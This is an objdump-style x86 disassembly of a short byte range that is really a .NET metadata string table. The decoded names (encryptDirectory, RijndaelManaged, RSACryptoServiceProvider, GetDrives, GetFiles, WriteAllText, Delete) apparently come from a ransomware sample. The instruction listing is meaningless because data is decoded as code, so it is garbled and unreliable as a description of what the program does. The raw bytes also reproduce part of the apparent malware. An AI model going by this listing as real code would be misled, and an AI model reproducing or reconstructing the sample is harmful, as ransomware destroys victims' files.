  404d06:	65 6d                	gs insl (%dx),%es:(%edi)
  404d08:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  404d0c:	67 65 74 5f          	addr16 gs je 0x404d6f
  404d10:	4c                   	dec    %esp
  404d11:	6f                   	outsl  %ds:(%esi),(%dx)
  404d12:	63 61 74             	arpl   %esp,0x74(%ecx)
  404d15:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  404d1c:	74 65                	je     0x404d83
  404d1e:	6d                   	insl   (%dx),%es:(%edi)
  404d1f:	2e 49                	cs dec %ecx
  404d21:	4f                   	dec    %edi
  404d22:	00 50 61             	add    %dl,0x61(%eax)
  404d25:	74 68                	je     0x404d8f
  404d27:	00 47 65             	add    %al,0x65(%edi)
  404d2a:	74 44                	je     0x404d70
  404d2c:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404d33:	79 4e                	jns    0x404d83
  404d35:	61                   	popa
  404d36:	6d                   	insl   (%dx),%es:(%edi)
  404d37:	65 00 53 70          	add    %dl,%gs:0x70(%ebx)
  404d3b:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  404d3f:	6c                   	insb   (%dx),%es:(%edi)
  404d40:	46                   	inc    %esi
  404d41:	6f                   	outsl  %ds:(%esi),(%dx)
  404d42:	6c                   	insb   (%dx),%es:(%edi)
  404d43:	64 65 72 00          	fs gs jb 0x404d47
  404d47:	47                   	inc    %edi
  404d48:	65 74 46             	gs je  0x404d91
  404d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4c:	6c                   	insb   (%dx),%es:(%edi)
  404d4d:	64 65 72 50          	fs gs jb 0x404da1
  404d51:	61                   	popa
  404d52:	74 68                	je     0x404dbc
  404d54:	00 53 74             	add    %dl,0x74(%ebx)
  404d57:	72 69                	jb     0x404dc2
  404d59:	6e                   	outsb  %ds:(%esi),(%dx)
  404d5a:	67 00 6f 70          	add    %ch,0x70(%bx)
  404d5e:	5f                   	pop    %edi
  404d5f:	49                   	dec    %ecx
  404d60:	6e                   	outsb  %ds:(%esi),(%dx)
  404d61:	65 71 75             	gs jno 0x404dd9
  404d64:	61                   	popa
  404d65:	6c                   	insb   (%dx),%es:(%edi)
  404d66:	69 74 79 00 53 6c 65 	imul   $0x65656c53,0x0(%ecx,%edi,2),%esi
  404d6d:	65 
  404d6e:	70 00                	jo     0x404d70
  404d70:	53                   	push   %ebx
  404d71:	79 73                	jns    0x404de6
  404d73:	74 65                	je     0x404dda
  404d75:	6d                   	insl   (%dx),%es:(%edi)
  404d76:	2e 44                	cs inc %esp
  404d78:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  404d7f:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  404d86:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d89:	73 00                	jae    0x404d8b
  404d8b:	47                   	inc    %edi
  404d8c:	65 74 50             	gs je  0x404ddf
  404d8f:	72 6f                	jb     0x404e00
  404d91:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d94:	73 65                	jae    0x404dfb
  404d96:	73 00                	jae    0x404d98
  404d98:	47                   	inc    %edi
  404d99:	65 74 43             	gs je  0x404ddf
  404d9c:	75 72                	jne    0x404e10
  404d9e:	72 65                	jb     0x404e05
  404da0:	6e                   	outsb  %ds:(%esi),(%dx)
  404da1:	74 50                	je     0x404df3
  404da3:	72 6f                	jb     0x404e14
  404da5:	63 65 73             	arpl   %esp,0x73(%ebp)
  404da8:	73 00                	jae    0x404daa
  404daa:	50                   	push   %eax
  404dab:	72 6f                	jb     0x404e1c
  404dad:	63 65 73             	arpl   %esp,0x73(%ebp)
  404db0:	73 4d                	jae    0x404dff
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	64 75 6c             	fs jne 0x404e22
  404db6:	65 43                	gs inc %ebx
  404db8:	6f                   	outsl  %ds:(%esi),(%dx)
  404db9:	6c                   	insb   (%dx),%es:(%edi)
  404dba:	6c                   	insb   (%dx),%es:(%edi)
  404dbb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  404dc0:	6e                   	outsb  %ds:(%esi),(%dx)
  404dc1:	00 67 65             	add    %ah,0x65(%edi)
  404dc4:	74 5f                	je     0x404e25
  404dc6:	4d                   	dec    %ebp
  404dc7:	6f                   	outsl  %ds:(%esi),(%dx)
  404dc8:	64 75 6c             	fs jne 0x404e37
  404dcb:	65 73 00             	gs jae 0x404dce
  404dce:	50                   	push   %eax
  404dcf:	72 6f                	jb     0x404e40
  404dd1:	63 65 73             	arpl   %esp,0x73(%ebp)
  404dd4:	73 4d                	jae    0x404e23
  404dd6:	6f                   	outsl  %ds:(%esi),(%dx)
  404dd7:	64 75 6c             	fs jne 0x404e46
  404dda:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  404dde:	74 5f                	je     0x404e3f
  404de0:	49                   	dec    %ecx
  404de1:	74 65                	je     0x404e48
  404de3:	6d                   	insl   (%dx),%es:(%edi)
  404de4:	00 67 65             	add    %ah,0x65(%edi)
  404de7:	74 5f                	je     0x404e48
  404de9:	46                   	inc    %esi
  404dea:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  404df1:	00 
  404df2:	47                   	inc    %edi
  404df3:	65 74 45             	gs je  0x404e3b
  404df6:	78 65                	js     0x404e5d
  404df8:	63 75 74             	arpl   %esi,0x74(%ebp)
  404dfb:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  404e02:	6d                   	insl   (%dx),%es:(%edi)
  404e03:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  404e07:	6f                   	outsl  %ds:(%esi),(%dx)
  404e08:	70 5f                	jo     0x404e69
  404e0a:	45                   	inc    %ebp
  404e0b:	71 75                	jno    0x404e82
  404e0d:	61                   	popa
  404e0e:	6c                   	insb   (%dx),%es:(%edi)
  404e0f:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  404e16:	5f 
  404e17:	49                   	dec    %ecx
  404e18:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  404e1c:	63 65 70             	arpl   %esp,0x70(%ebp)
  404e1f:	74 69                	je     0x404e8a
  404e21:	6f                   	outsl  %ds:(%esi),(%dx)
  404e22:	6e                   	outsb  %ds:(%esi),(%dx)
  404e23:	00 42 79             	add    %al,0x79(%edx)
  404e26:	74 65                	je     0x404e8d
  404e28:	00 4e 65             	add    %cl,0x65(%esi)
  404e2b:	78 74                	js     0x404ea1
  404e2d:	42                   	inc    %edx
  404e2e:	79 74                	jns    0x404ea4
  404e30:	65 73 00             	gs jae 0x404e33
  404e33:	53                   	push   %ebx
  404e34:	79 73                	jns    0x404ea9
  404e36:	74 65                	je     0x404e9d
  404e38:	6d                   	insl   (%dx),%es:(%edi)
  404e39:	2e 54                	cs push %esp
  404e3b:	65 78 74             	gs js  0x404eb2
  404e3e:	00 53 74             	add    %dl,0x74(%ebx)
  404e41:	72 69                	jb     0x404eac
  404e43:	6e                   	outsb  %ds:(%esi),(%dx)
  404e44:	67 42                	addr16 inc %edx
  404e46:	75 69                	jne    0x404eb1
  404e48:	6c                   	insb   (%dx),%es:(%edi)
  404e49:	64 65 72 00          	fs gs jb 0x404e4d
  404e4d:	67 65 74 5f          	addr16 gs je 0x404eb0
  404e51:	4c                   	dec    %esp
  404e52:	65 6e                	outsb  %gs:(%esi),(%dx)
  404e54:	67 74 68             	addr16 je 0x404ebf
  404e57:	00 4e 65             	add    %cl,0x65(%esi)
  404e5a:	78 74                	js     0x404ed0
  404e5c:	00 67 65             	add    %ah,0x65(%edi)
  404e5f:	74 5f                	je     0x404ec0
  404e61:	43                   	inc    %ebx
  404e62:	68 61 72 73 00       	push   $0x737261
  404e67:	41                   	inc    %ecx
  404e68:	70 70                	jo     0x404eda
  404e6a:	65 6e                	outsb  %gs:(%esi),(%dx)
  404e6c:	64 00 54 6f 53       	add    %dl,%fs:0x53(%edi,%ebp,2)
  404e71:	74 72                	je     0x404ee5
  404e73:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  404e7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404e7b:	64 69 6e 67 00 67 65 	imul   $0x74656700,%fs:0x67(%esi),%ebp
  404e82:	74 
  404e83:	5f                   	pop    %edi
  404e84:	55                   	push   %ebp
  404e85:	54                   	push   %esp
  404e86:	46                   	inc    %esi
  404e87:	38 00                	cmp    %al,(%eax)
  404e89:	47                   	inc    %edi
  404e8a:	65 74 42             	gs je  0x404ecf
  404e8d:	79 74                	jns    0x404f03
  404e8f:	65 73 00             	gs jae 0x404e92
  404e92:	43                   	inc    %ebx
  404e93:	6f                   	outsl  %ds:(%esi),(%dx)
  404e94:	6e                   	outsb  %ds:(%esi),(%dx)
  404e95:	76 65                	jbe    0x404efc
  404e97:	72 74                	jb     0x404f0d
  404e99:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  404e9d:	61                   	popa
  404e9e:	73 65                	jae    0x404f05
  404ea0:	36 34 53             	ss xor $0x53,%al
  404ea3:	74 72                	je     0x404f17
  404ea5:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  404eac:	63 61 74             	arpl   %esp,0x74(%ecx)
  404eaf:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  404eb2:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  404eb5:	44                   	inc    %esp
  404eb6:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404ebd:	6c                   	insb   (%dx),%es:(%edi)
  404ebe:	61                   	popa
  404ebf:	73 73                	jae    0x404f34
  404ec1:	33 00                	xor    (%eax),%eax
  404ec3:	65 78 74             	gs js  0x404f3a
  404ec6:	65 6e                	outsb  %gs:(%esi),(%dx)
  404ec8:	73 69                	jae    0x404f33
  404eca:	6f                   	outsl  %ds:(%esi),(%dx)
  404ecb:	6e                   	outsb  %ds:(%esi),(%dx)
  404ecc:	00 3c 65 6e 63 72 79 	add    %bh,0x7972636e(,%eiz,2)
  404ed3:	70 74                	jo     0x404f49
  404ed5:	44                   	inc    %esp
  404ed6:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404edd:	79 3e                	jns    0x404f1d
  404edf:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404ee2:	32 00                	xor    (%eax),%al
  404ee4:	45                   	inc    %ebp
  404ee5:	00 54 6f 4c          	add    %dl,0x4c(%edi,%ebp,2)
  404ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  404eea:	77 65                	ja     0x404f51
  404eec:	72 00                	jb     0x404eee
  404eee:	44                   	inc    %esp
  404eef:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404ef6:	79 00                	jns    0x404ef8
  404ef8:	47                   	inc    %edi
  404ef9:	65 74 46             	gs je  0x404f42
  404efc:	69 6c 65 73 00 47 65 	imul   $0x74654700,0x73(%ebp,%eiz,2),%ebp
  404f03:	74 
  404f04:	45                   	inc    %ebp
  404f05:	78 74                	js     0x404f7b
  404f07:	65 6e                	outsb  %gs:(%esi),(%dx)
  404f09:	73 69                	jae    0x404f74
  404f0b:	6f                   	outsl  %ds:(%esi),(%dx)
  404f0c:	6e                   	outsb  %ds:(%esi),(%dx)
  404f0d:	00 47 65             	add    %al,0x65(%edi)
  404f10:	74 46                	je     0x404f58
  404f12:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  404f19:	00 
  404f1a:	50                   	push   %eax
  404f1b:	72 65                	jb     0x404f82
  404f1d:	64 69 63 61 74 65 60 	imul   $0x31606574,%fs:0x61(%ebx),%esp
  404f24:	31 
  404f25:	00 41 72             	add    %al,0x72(%ecx)
  404f28:	72 61                	jb     0x404f8b
  404f2a:	79 00                	jns    0x404f2c
  404f2c:	45                   	inc    %ebp
  404f2d:	78 69                	js     0x404f98
  404f2f:	73 74                	jae    0x404fa5
  404f31:	73 00                	jae    0x404f33
  404f33:	46                   	inc    %esi
  404f34:	69 6c 65 49 6e 66 6f 	imul   $0x6f666e,0x49(%ebp,%eiz,2),%ebp
  404f3b:	00 
  404f3c:	46                   	inc    %esi
  404f3d:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  404f44:	65 
  404f45:	6d                   	insl   (%dx),%es:(%edi)
  404f46:	49                   	dec    %ecx
  404f47:	6e                   	outsb  %ds:(%esi),(%dx)
  404f48:	66 6f                	outsw  %ds:(%esi),(%dx)
  404f4a:	00 46 69             	add    %al,0x69(%esi)
  404f4d:	6c                   	insb   (%dx),%es:(%edi)
  404f4e:	65 41                	gs inc %ecx
  404f50:	74 74                	je     0x404fc6
  404f52:	72 69                	jb     0x404fbd
  404f54:	62 75 74             	bound  %esi,0x74(%ebp)
  404f57:	65 73 00             	gs jae 0x404f5a
  404f5a:	73 65                	jae    0x404fc1
  404f5c:	74 5f                	je     0x404fbd
  404f5e:	41                   	inc    %ecx
  404f5f:	74 74                	je     0x404fd5
  404f61:	72 69                	jb     0x404fcc
  404f63:	62 75 74             	bound  %esi,0x74(%ebp)
  404f66:	65 73 00             	gs jae 0x404f69
  404f69:	47                   	inc    %edi
  404f6a:	65 74 53             	gs je  0x404fc0
  404f6d:	74 72                	je     0x404fe1
  404f6f:	69 6e 67 00 46 69 6c 	imul   $0x6c694600,0x67(%esi),%ebp
  404f76:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  404f7a:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  404f81:	65 
  404f82:	78 74                	js     0x404ff8
  404f84:	00 4d 6f             	add    %cl,0x6f(%ebp)
  404f87:	76 65                	jbe    0x404fee
  404f89:	00 54 6f 49          	add    %dl,0x49(%edi,%ebp,2)
  404f8d:	6e                   	outsb  %ds:(%esi),(%dx)
  404f8e:	74 33                	je     0x404fc3
  404f90:	32 00                	xor    (%eax),%al
  404f92:	57                   	push   %edi
  404f93:	72 69                	jb     0x404ffe
  404f95:	74 65                	je     0x404ffc
  404f97:	41                   	inc    %ecx
  404f98:	6c                   	insb   (%dx),%es:(%edi)
  404f99:	6c                   	insb   (%dx),%es:(%edi)
  404f9a:	4c                   	dec    %esp
  404f9b:	69 6e 65 73 00 47 65 	imul   $0x65470073,0x65(%esi),%ebp
  404fa2:	74 44                	je     0x404fe8
  404fa4:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404fab:	69 65 73 00 3c 50 72 	imul   $0x72503c00,0x73(%ebp),%esp
  404fb2:	69 76 61 74 65 49 6d 	imul   $0x6d496574,0x61(%esi),%esi
  404fb9:	70 6c                	jo     0x405027
  404fbb:	65 6d                	gs insl (%dx),%es:(%edi)
  404fbd:	65 6e                	outsb  %gs:(%esi),(%dx)
  404fbf:	74 61                	je     0x405022
  404fc1:	74 69                	je     0x40502c
  404fc3:	6f                   	outsl  %ds:(%esi),(%dx)
  404fc4:	6e                   	outsb  %ds:(%esi),(%dx)
  404fc5:	44                   	inc    %esp
  404fc6:	65 74 61             	gs je  0x40502a
  404fc9:	69 6c 73 3e 7b 46 45 	imul   $0x3345467b,0x3e(%ebx,%esi,2),%ebp
  404fd0:	33 
  404fd1:	31 31                	xor    %esi,(%ecx)
  404fd3:	36 34 33             	ss xor $0x33,%al
  404fd6:	2d 46 36 34 43       	sub    $0x43343646,%eax
  404fdb:	2d 34 43 30 30       	sub    $0x30304334,%eax
  404fe0:	2d 41 44 31 44       	sub    $0x44314441,%eax
  404fe5:	2d 30 42 35 44       	sub    $0x44354230,%eax
  404fea:	31 39                	xor    %edi,(%ecx)
  404fec:	45                   	inc    %ebp
  404fed:	32 38                	xor    (%eax),%bh
  404fef:	42                   	inc    %edx
  404ff0:	36 31 7d 00          	xor    %edi,%ss:0x0(%ebp)
  404ff4:	24 24                	and    $0x24,%al
  404ff6:	6d                   	insl   (%dx),%es:(%edi)
  404ff7:	65 74 68             	gs je  0x405062
  404ffa:	6f                   	outsl  %ds:(%esi),(%dx)
  404ffb:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  404fff:	30 30                	xor    %dh,(%eax)
  405001:	30 30                	xor    %dh,(%eax)
  405003:	30 65 2d             	xor    %ah,0x2d(%ebp)
  405006:	31 00                	xor    %eax,(%eax)
  405008:	52                   	push   %edx
  405009:	75 6e                	jne    0x405079
  40500b:	74 69                	je     0x405076
  40500d:	6d                   	insl   (%dx),%es:(%edi)
  40500e:	65 48                	gs dec %eax
  405010:	65 6c                	gs insb (%dx),%es:(%edi)
  405012:	70 65                	jo     0x405079
  405014:	72 73                	jb     0x405089
  405016:	00 52 75             	add    %dl,0x75(%edx)
  405019:	6e                   	outsb  %ds:(%esi),(%dx)
  40501a:	74 69                	je     0x405085
  40501c:	6d                   	insl   (%dx),%es:(%edi)
  40501d:	65 46                	gs inc %esi
  40501f:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  405026:	64 6c                	fs insb (%dx),%es:(%edi)
  405028:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  40502c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  405033:	65 
  405034:	41                   	inc    %ecx
  405035:	72 72                	jb     0x4050a9
  405037:	61                   	popa
  405038:	79 00                	jns    0x40503a
  40503a:	4d                   	dec    %ebp
  40503b:	65 6d                	gs insl (%dx),%es:(%edi)
  40503d:	6f                   	outsl  %ds:(%esi),(%dx)
  40503e:	72 79                	jb     0x4050b9
  405040:	53                   	push   %ebx
  405041:	74 72                	je     0x4050b5
  405043:	65 61                	gs popa
  405045:	6d                   	insl   (%dx),%es:(%edi)
  405046:	00 53 79             	add    %dl,0x79(%ebx)
  405049:	73 74                	jae    0x4050bf
  40504b:	65 6d                	gs insl (%dx),%es:(%edi)
  40504d:	2e 53                	cs push %ebx
  40504f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  405053:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40505a:	70 
  40505b:	74 6f                	je     0x4050cc
  40505d:	67 72 61             	addr16 jb 0x4050c1
  405060:	70 68                	jo     0x4050ca
  405062:	79 00                	jns    0x405064
  405064:	52                   	push   %edx
  405065:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  40506c:	4d                   	dec    %ebp
  40506d:	61                   	popa
  40506e:	6e                   	outsb  %ds:(%esi),(%dx)
  40506f:	61                   	popa
  405070:	67 65 64 00 53 79    	gs add %dl,%fs:0x79(%bp,%di)
  405076:	6d                   	insl   (%dx),%es:(%edi)
  405077:	6d                   	insl   (%dx),%es:(%edi)
  405078:	65 74 72             	gs je  0x4050ed
  40507b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  405082:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  405089:	74 
  40508a:	5f                   	pop    %edi
  40508b:	4b                   	dec    %ebx
  40508c:	65 79 53             	gs jns 0x4050e2
  40508f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  405096:	5f                   	pop    %edi
  405097:	42                   	inc    %edx
  405098:	6c                   	insb   (%dx),%es:(%edi)
  405099:	6f                   	outsl  %ds:(%esi),(%dx)
  40509a:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40509d:	69 7a 65 00 52 66 63 	imul   $0x63665200,0x65(%edx),%edi
  4050a4:	32 38                	xor    (%eax),%bh
  4050a6:	39 38                	cmp    %edi,(%eax)
  4050a8:	44                   	inc    %esp
  4050a9:	65 72 69             	gs jb  0x405115
  4050ac:	76 65                	jbe    0x405113
  4050ae:	42                   	inc    %edx
  4050af:	79 74                	jns    0x405125
  4050b1:	65 73 00             	gs jae 0x4050b4
  4050b4:	67 65 74 5f          	addr16 gs je 0x405117
  4050b8:	4b                   	dec    %ebx
  4050b9:	65 79 53             	gs jns 0x40510f
  4050bc:	69 7a 65 00 44 65 72 	imul   $0x72654400,0x65(%edx),%edi
  4050c3:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4050ca:	73 00                	jae    0x4050cc
  4050cc:	73 65                	jae    0x405133
  4050ce:	74 5f                	je     0x40512f
  4050d0:	4b                   	dec    %ebx
  4050d1:	65 79 00             	gs jns 0x4050d4
  4050d4:	67 65 74 5f          	addr16 gs je 0x405137
  4050d8:	42                   	inc    %edx
  4050d9:	6c                   	insb   (%dx),%es:(%edi)
  4050da:	6f                   	outsl  %ds:(%esi),(%dx)
  4050db:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  4050de:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4050e5:	5f                   	pop    %edi
  4050e6:	49                   	dec    %ecx
  4050e7:	56                   	push   %esi
  4050e8:	00 43 69             	add    %al,0x69(%ebx)
  4050eb:	70 68                	jo     0x405155
  4050ed:	65 72 4d             	gs jb  0x40513d
  4050f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4050f1:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4050f6:	74 5f                	je     0x405157
  4050f8:	4d                   	dec    %ebp
  4050f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4050fa:	64 65 00 49 43       	fs add %cl,%gs:0x43(%ecx)
  4050ff:	72 79                	jb     0x40517a
  405101:	70 74                	jo     0x405177
  405103:	6f                   	outsl  %ds:(%esi),(%dx)
  405104:	54                   	push   %esp
  405105:	72 61                	jb     0x405168
  405107:	6e                   	outsb  %ds:(%esi),(%dx)
  405108:	73 66                	jae    0x405170
  40510a:	6f                   	outsl  %ds:(%esi),(%dx)
  40510b:	72 6d                	jb     0x40517a
  40510d:	00 43 72             	add    %al,0x72(%ebx)
  405110:	65 61                	gs popa
  405112:	74 65                	je     0x405179
  405114:	45                   	inc    %ebp
  405115:	6e                   	outsb  %ds:(%esi),(%dx)
  405116:	63 72 79             	arpl   %esi,0x79(%edx)
  405119:	70 74                	jo     0x40518f
  40511b:	6f                   	outsl  %ds:(%esi),(%dx)
  40511c:	72 00                	jb     0x40511e
  40511e:	43                   	inc    %ebx
  40511f:	72 79                	jb     0x40519a
  405121:	70 74                	jo     0x405197
  405123:	6f                   	outsl  %ds:(%esi),(%dx)
  405124:	53                   	push   %ebx
  405125:	74 72                	je     0x405199
  405127:	65 61                	gs popa
  405129:	6d                   	insl   (%dx),%es:(%edi)
  40512a:	00 53 74             	add    %dl,0x74(%ebx)
  40512d:	72 65                	jb     0x405194
  40512f:	61                   	popa
  405130:	6d                   	insl   (%dx),%es:(%edi)
  405131:	00 43 72             	add    %al,0x72(%ebx)
  405134:	79 70                	jns    0x4051a6
  405136:	74 6f                	je     0x4051a7
  405138:	53                   	push   %ebx
  405139:	74 72                	je     0x4051ad
  40513b:	65 61                	gs popa
  40513d:	6d                   	insl   (%dx),%es:(%edi)
  40513e:	4d                   	dec    %ebp
  40513f:	6f                   	outsl  %ds:(%esi),(%dx)
  405140:	64 65 00 57 72       	fs add %dl,%gs:0x72(%edi)
  405145:	69 74 65 00 43 6c 6f 	imul   $0x736f6c43,0x0(%ebp,%eiz,2),%esi
  40514c:	73 
  40514d:	65 00 49 44          	add    %cl,%gs:0x44(%ecx)
  405151:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  405158:	6c                   	insb   (%dx),%es:(%edi)
  405159:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  40515e:	70 6f                	jo     0x4051cf
  405160:	73 65                	jae    0x4051c7
  405162:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  405166:	72 72                	jb     0x4051da
  405168:	61                   	popa
  405169:	79 00                	jns    0x40516b
  40516b:	52                   	push   %edx
  40516c:	65 61                	gs popa
  40516e:	64 41                	fs inc %ecx
  405170:	6c                   	insb   (%dx),%es:(%edi)
  405171:	6c                   	insb   (%dx),%es:(%edi)
  405172:	42                   	inc    %edx
  405173:	79 74                	jns    0x4051e9
  405175:	65 73 00             	gs jae 0x405178
  405178:	52                   	push   %edx
  405179:	53                   	push   %ebx
  40517a:	41                   	inc    %ecx
  40517b:	43                   	inc    %ebx
  40517c:	72 79                	jb     0x4051f7
  40517e:	70 74                	jo     0x4051f4
  405180:	6f                   	outsl  %ds:(%esi),(%dx)
  405181:	53                   	push   %ebx
  405182:	65 72 76             	gs jb  0x4051fb
  405185:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40518c:	69 64 65 72 00 41 73 	imul   $0x79734100,0x72(%ebp,%eiz,2),%esp
  405193:	79 
  405194:	6d                   	insl   (%dx),%es:(%edi)
  405195:	6d                   	insl   (%dx),%es:(%edi)
  405196:	65 74 72             	gs je  0x40520b
  405199:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4051a0:	69 74 68 6d 00 46 72 	imul   $0x6f724600,0x6d(%eax,%ebp,2),%esi
  4051a7:	6f 
  4051a8:	6d                   	insl   (%dx),%es:(%edi)
  4051a9:	58                   	pop    %eax
  4051aa:	6d                   	insl   (%dx),%es:(%edi)
  4051ab:	6c                   	insb   (%dx),%es:(%edi)
  4051ac:	53                   	push   %ebx
  4051ad:	74 72                	je     0x405221
  4051af:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  4051b6:	72 79                	jb     0x405231
  4051b8:	70 74                	jo     0x40522e
  4051ba:	00 73 65             	add    %dh,0x65(%ebx)
  4051bd:	74 5f                	je     0x40521e
  4051bf:	50                   	push   %eax
  4051c0:	65 72 73             	gs jb  0x405236
  4051c3:	69 73 74 4b 65 79 49 	imul   $0x4979654b,0x74(%ebx),%esi
  4051ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4051cb:	43                   	inc    %ebx
  4051cc:	73 70                	jae    0x40523e
  4051ce:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4051d2:	76 65                	jbe    0x405239
  4051d4:	49                   	dec    %ecx
  4051d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4051d6:	66 6f                	outsw  %ds:(%esi),(%dx)
  4051d8:	00 47 65             	add    %al,0x65(%edi)
  4051db:	74 44                	je     0x405221
  4051dd:	72 69                	jb     0x405248
  4051df:	76 65                	jbe    0x405246
  4051e1:	73 00                	jae    0x4051e3
  4051e3:	41                   	inc    %ecx
  4051e4:	70 70                	jo     0x405256
  4051e6:	44                   	inc    %esp
  4051e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4051e8:	6d                   	insl   (%dx),%es:(%edi)
  4051e9:	61                   	popa
  4051ea:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4051f1:	43                   	inc    %ebx
  4051f2:	75 72                	jne    0x405266
  4051f4:	72 65                	jb     0x40525b
  4051f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4051f7:	74 44                	je     0x40523d
  4051f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4051fa:	6d                   	insl   (%dx),%es:(%edi)
  4051fb:	61                   	popa
  4051fc:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  405203:	46                   	inc    %esi
  405204:	72 69                	jb     0x40526f
  405206:	65 6e                	outsb  %gs:(%esi),(%dx)
  405208:	64 6c                	fs insb (%dx),%es:(%edi)
  40520a:	79 4e                	jns    0x40525a
  40520c:	61                   	popa
  40520d:	6d                   	insl   (%dx),%es:(%edi)
  40520e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405212:	70 79                	jo     0x40528d
  405214:	00 50 72             	add    %dl,0x72(%eax)
  405217:	6f                   	outsl  %ds:(%esi),(%dx)
  405218:	63 65 73             	arpl   %esp,0x73(%ebp)
  40521b:	73 53                	jae    0x405270
  40521d:	74 61                	je     0x405280
  40521f:	72 74                	jb     0x405295
  405221:	49                   	dec    %ecx
  405222:	6e                   	outsb  %ds:(%esi),(%dx)
  405223:	66 6f                	outsw  %ds:(%esi),(%dx)
  405225:	00 73 65             	add    %dh,0x65(%ebx)
  405228:	74 5f                	je     0x405289
  40522a:	57                   	push   %edi
  40522b:	6f                   	outsl  %ds:(%esi),(%dx)
  40522c:	72 6b                	jb     0x405299
  40522e:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  405235:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405239:	79 00                	jns    0x40523b
  40523b:	73 65                	jae    0x4052a2
  40523d:	74 5f                	je     0x40529e
  40523f:	53                   	push   %ebx
  405240:	74 61                	je     0x4052a3
  405242:	72 74                	jb     0x4052b8
  405244:	49                   	dec    %ecx
  405245:	6e                   	outsb  %ds:(%esi),(%dx)
  405246:	66 6f                	outsw  %ds:(%esi),(%dx)
  405248:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  40524c:	65 74 65             	gs je  0x4052b4
  40524f:	00 73 65             	add    %dh,0x65(%ebx)
  405252:	74 5f                	je     0x4052b3
  405254:	55                   	push   %ebp
  405255:	73 65                	jae    0x4052bc
  405257:	53                   	push   %ebx
  405258:	68 65 6c 6c 45       	push   $0x456c6c65
  40525d:	78 65                	js     0x4052c4
  40525f:	63 75 74             	arpl   %esi,0x74(%ebp)
  405262:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405266:	74 5f                	je     0x4052c7
  405268:	56                   	push   %esi
